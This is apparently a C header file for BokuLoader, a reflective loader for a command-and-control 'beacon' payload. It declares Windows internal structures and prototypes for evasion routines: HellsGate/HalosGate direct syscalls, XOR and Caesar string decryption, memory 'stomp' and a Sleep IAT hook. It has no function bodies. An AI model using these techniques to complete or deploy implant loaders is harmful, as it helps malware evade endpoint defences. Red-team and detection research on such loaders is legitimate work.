#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#define STATUS_SUCCESS 0x0

typedef struct Export {
    void *   Directory;
    unsigned int DirectorySize;
    void *   AddressTable;
    void *   NameTable;
    void *   OrdinalTable;
    unsigned int NumberOfNames;
}Export;

typedef struct Dll {
    void* dllBase;
    void* NewExeHeader;
    unsigned int size;
    unsigned int SizeOfHeaders;
    void* OptionalHeader;
    void* SizeOfOptionalHeader;
    void* NthSection;
    unsigned int NumberOfSections;
    int BeaconMemoryProtection;
    void* EntryPoint;
    void* TextSection;
    unsigned int TextSectionSize;
    Export Export;
    unsigned __int64 obfuscate;
    unsigned char xor_key;
}Dll, *PDll;

typedef struct Section {
    void* RVA;
    void* dst_rdll_VA;
    void* src_rdll_VA;
    void* PointerToRawData;
    unsigned int SizeOfSection;
    unsigned int Characteristics;
}Section;

#if !defined(NTSTATUS)
typedef LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif

#define WOW64_POINTER(Type) ULONG
typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// https://github.com/kyleavery/AceLdr/blob/main/src/native.h
typedef struct _STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PCHAR Buffer;
} STRING;
typedef STRING *PSTRING;

typedef STRING ANSI_STRING;
typedef PSTRING PANSI_STRING;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING, **PPUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;

typedef STRING CANSI_STRING;
typedef PSTRING PCANSI_STRING;

typedef CONST char *PCSZ;

// WinDbg> dt -v ntdll!_LDR_DATA_TABLE_ENTRY
typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;                 //    +0x000
    LIST_ENTRY InMemoryOrderModuleList;          //    +0x010
    LIST_ENTRY InInitializationOrderModuleList;  //    +0x020
    PVOID DllBase;                               //    +0x030
    PVOID EntryPoint;                            //    +0x038
    PVOID SizeOfImage;                           //    +0x040
    UNICODE_STRING FullDllName;                  //    +0x048
    UNICODE_STRING BaseDllName;                  //    +0x058
    PVOID Flags;                                 //    +0x068
    LIST_ENTRY HashTableEntry;                   //    +0x070
    PVOID TimeDateStamp;                         //    +0x080
    PVOID EntryPointActivationContext;           //    +0x088
    PVOID Lock;                                  //    +0x090
    PVOID DdagNode;                              //    +0x098
    LIST_ENTRY NodeModuleLink;                   //    +0x0a0
    PVOID LoadContext;                           //    +0x0b0
    PVOID ParentDllBase;                         //    +0x0b8
    PVOID SwitchBackContext;                     //    +0x0c0
    LIST_ENTRY BaseAddressIndexNode1;            //    +0x0c8
    PVOID BaseAddressIndexNode3;                 //    +0x0d8
    PVOID MappingInfoIndexNode1;                 //    +0x0e0
    PVOID MappingInfoIndexNode2;                 //    +0x0e8
    PVOID MappingInfoIndexNode3;                 //    +0x0f0
    PVOID OriginalBase;                          //    +0x0f8
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA //, 7 elements, 0x28 bytes
{
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes
{
    struct _PEB_FREE_BLOCK* pNext;
    DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef struct __PEB
{
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STRING usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} _PEB, * PPEB;

#define GDI_BATCH_BUFFER_SIZE 310
typedef struct _STRING32
{
	USHORT Length;
	USHORT MaximumLength;
	ULONG Buffer;
} STRING32;
typedef STRING32 *PSTRING32;

typedef STRING32 UNICODE_STRING32;
typedef UNICODE_STRING32 *PUNICODE_STRING32;

typedef struct _GDI_TEB_BATCH32
{
	ULONG Offset;
	WOW64_POINTER(ULONG_PTR) HDC;
	ULONG Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH32, *PGDI_TEB_BATCH32;

typedef struct _TEB32
{
	NT_TIB32 NtTib;

	WOW64_POINTER(PVOID) EnvironmentPointer;
	CLIENT_ID ClientId;
	WOW64_POINTER(PVOID) ActiveRpcHandle;
	WOW64_POINTER(PVOID) ThreadLocalStoragePointer;
	WOW64_POINTER(PPEB) ProcessEnvironmentBlock;

	ULONG LastErrorValue;
	ULONG CountOfOwnedCriticalSections;
	WOW64_POINTER(PVOID) CsrClientThread;
	WOW64_POINTER(PVOID) Win32ThreadInfo;
	ULONG User32Reserved[26];
	ULONG UserReserved[5];
	WOW64_POINTER(PVOID) WOW32Reserved;
	LCID CurrentLocale;
	ULONG FpSoftwareStatusRegister;
	WOW64_POINTER(PVOID) SystemReserved1[54];
	NTSTATUS ExceptionCode;
	WOW64_POINTER(PVOID) ActivationContextStackPointer;
	BYTE SpareBytes[36];
	ULONG TxFsContext;

	GDI_TEB_BATCH32 GdiTebBatch;
	CLIENT_ID RealClientId;
	WOW64_POINTER(HANDLE) GdiCachedProcessHandle;
	ULONG GdiClientPID;
	ULONG GdiClientTID;
	WOW64_POINTER(PVOID) GdiThreadLocalInfo;
	WOW64_POINTER(ULONG_PTR) Win32ClientInfo[62];
	WOW64_POINTER(PVOID) glDispatchTable[233];
	WOW64_POINTER(ULONG_PTR) glReserved1[29];
	WOW64_POINTER(PVOID) glReserved2;
	WOW64_POINTER(PVOID) glSectionInfo;
	WOW64_POINTER(PVOID) glSection;
	WOW64_POINTER(PVOID) glTable;
	WOW64_POINTER(PVOID) glCurrentRC;
	WOW64_POINTER(PVOID) glContext;

	NTSTATUS LastStatusValue;
	UNICODE_STRING32 StaticUnicodeString;
	WCHAR StaticUnicodeBuffer[261];

	WOW64_POINTER(PVOID) DeallocationStack;
	WOW64_POINTER(PVOID) TlsSlots[64];
	LIST_ENTRY32 TlsLinks;
} TEB32, *PTEB32;

// https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-crt/intrincs/RtlSecureZeroMemory.c
PVOID WINAPI RtlSecureZeroMemory(PVOID ptr,SIZE_T cnt);

typedef enum _PROCESSINFOCLASS {
  ProcessBasicInformation = 0,
  ProcessDebugPort = 7,
  ProcessWow64Information = 26,
  ProcessImageFileName = 27,
  ProcessBreakOnTermination = 29
} PROCESSINFOCLASS;

typedef enum _MEMORY_INFORMATION_CLASS {
  MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;


void* Setup();
void* BokuLoader();
void checkObfuscate(Dll * raw_beacon_dll_struct);
void checkUseRWX(Dll * raw_beacon_dll_struct);
void * returnRDI();
void * getPEB();
void basicCaesar_Decrypt(int stringLength, unsigned char * string, int chiperDecrementKey);
void *   getDllBase(char *);
void *   getFirstEntry(void);
void *   getNextEntry(void * currentEntry, void * firstEntry);
void *   getDllBaseFromEntry(void * entry);
void    Memcpy(void * destination, void * source, unsigned int num);
void *   getExportDirectory(void * dllAddr);
unsigned long   getExportDirectorySize(void * dllAddr);
void *   getExportAddressTable(void * dllBase, void * dllExportDirectory);
void *   getExportNameTable(void * dllBase, void * dllExportDirectory);
void *   getExportOrdinalTable(void * dllBase, void * dllExportDirectory);
unsigned int getNumberOfNames(void * dllExportDirectory);
void *   getSymbolAddress(void * symbolStr, unsigned long StrSize, void * dllBase, void * AddressTable, void * NameTable, void * OrdinalTable, unsigned int NumberOfNames);
void *   xGetProcAddress(void * symbolStr, PDll dll); void *   getRdllBase(void *);
void * xLoadLibrary(void * library_name);
void *   getNewExeHeader(void * dllBase);
unsigned int getDllSize(void * newExeHeader);
unsigned int getDllSizeOfHeaders(void * newExeHeader);
void *   getOptionalHeader(void * NewExeHeader);
void *   getSizeOfOptionalHeader(void * NewExeHeader);
void *   add(void * a, void * b);
unsigned int getNumberOfSections(void * newExeHeaderAddr);
void *   getBeaconEntryPoint(void * newRdllAddr, void * OptionalHeaderAddr);
void *   getRip(void);
unsigned int copyWithDelimiter(void * dst, void * src, unsigned int n, CHAR delimiter);
void xorc(unsigned __int64 length, unsigned char * buff, unsigned char maskkey);

unsigned long findSyscallNumber(void * ntdllApiAddr);
unsigned long HellsGate(unsigned long wSystemCall);
void  HellDescent(void);
unsigned long halosGateDown(void * ntdllApiAddr, unsigned long index);
unsigned long halosGateUp(void * ntdllApiAddr, unsigned long index);
unsigned long getSyscallNumber(void * functionAddress);
void parseDLL(Dll * dll);
SIZE_T CharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed );
SIZE_T StringLengthA(LPCSTR String);

void* checkFakeEntryAddress_returnReal(Dll * raw_beacon_dll_struct, Dll * virtual_beacon_dll_struct);

typedef void *  (WINAPI * tLoadLibraryA)  (char *);
typedef void *  (WINAPI * t_LoadLibraryExA)  (char *lpLibFileName,HANDLE hFile,DWORD  dwFlags);
typedef void*  (WINAPI * tGetProcAddress)(void*, char*);
typedef LONG32 (NTAPI  * tNtProt)        (void *, void *, void *, unsigned int, void *);
typedef LONG32 (NTAPI  * tNtAlloc)       (void *, void *, unsigned long *, PSIZE_T, unsigned long, unsigned long);
typedef LONG32 (NTAPI  * tNtFree)        (void *, void *, PSIZE_T, unsigned long);

typedef HANDLE(WINAPI* t_CreateFileMappingA)( HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
typedef LPVOID(WINAPI* t_MapViewOfFile)( HANDLE hFileMappingObject, DWORD  dwDesiredAccess, DWORD  dwFileOffsetHigh, DWORD  dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);

typedef NTSTATUS(NTAPI  * t_LdrGetProcedureAddress)( IN PVOID DllHandle, IN OPTIONAL PANSI_STRING ProcedureName, IN OPTIONAL ULONG ProcedureNumber, OUT PVOID *ProcedureAddress);
typedef NTSTATUS (NTAPI * t_RtlAnsiStringToUnicodeString)(PUNICODE_STRING DestinationString, PCANSI_STRING SourceString, BOOLEAN AllocateDestinationString);
typedef VOID (NTAPI * t_RtlFreeUnicodeString)(PUNICODE_STRING UnicodeString);
typedef VOID (NTAPI * t_RtlInitAnsiString)(PANSI_STRING DestinationString, PCSZ SourceString);
typedef NTSTATUS (NTAPI * t_LdrLoadDll)(OPTIONAL PWSTR DllPath, OPTIONAL PULONG DllCharacteristics, PUNICODE_STRING DllName, PVOID *DllHandle);
typedef long(NTAPI* tNtQueryVirtualMemory)( HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);
typedef NTSTATUS  (NTAPI * t_NtUnmapViewOfSection)( IN HANDLE ProcessHandle, IN PVOID BaseAddress);
typedef void*    (NTAPI * tNtDelayExecution)( BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);

typedef void*  (WINAPI * tGetProcessHeap)();
typedef void*  (WINAPI * tHeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);


typedef struct APIS{
    tLoadLibraryA LoadLibraryA;
    t_LoadLibraryExA LoadLibraryEx;
    tHeapAlloc HeapAlloc;
    tGetProcessHeap GetProcessHeap;
//    tGetProcAddress GetProcAddress;
    t_CreateFileMappingA CreateFileMappingA;
    t_MapViewOfFile MapViewOfFile;
    t_LdrGetProcedureAddress LdrGetProcedureAddress;
    t_RtlAnsiStringToUnicodeString RtlAnsiStringToUnicodeString;
    t_RtlFreeUnicodeString  RtlFreeUnicodeString;
    t_RtlInitAnsiString RtlInitAnsiString;
    t_LdrLoadDll LdrLoadDll;
    t_NtUnmapViewOfSection NtUnmapViewOfSection;
    tNtQueryVirtualMemory NtQueryVirtualMemory;
    void* pNtAllocateVirtualMemory;
    void* pNtProtectVirtualMemory;
    void* pNtFreeVirtualMemory;
}APIS;

void getApis(APIS * api);
void doSections(Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
void doRelocations(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
void stomp(unsigned __int64 length, unsigned char * buff);
void* get_virtual_Hook_address(Dll * raw_beacon_dll, Dll * virtual_beacon_dll, void* raw_hook_address);
void* check_and_write_IAT_Hook(char* EntryName, Dll * virtual_beacon_dll, Dll * raw_beacon_dll);
void Sleep_Hook(DWORD dwMilliseconds);
typedef void*  (WINAPI * DLLMAIN)(HINSTANCE, unsigned int, void *);
BOOL StringCompareA( LPCSTR String1, LPCSTR String2 );

#define NtCurrentProcess() ( (void *)(LONG_PTR) -1 )

#ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) ((LONG32)(Status) >= 0)
#endif
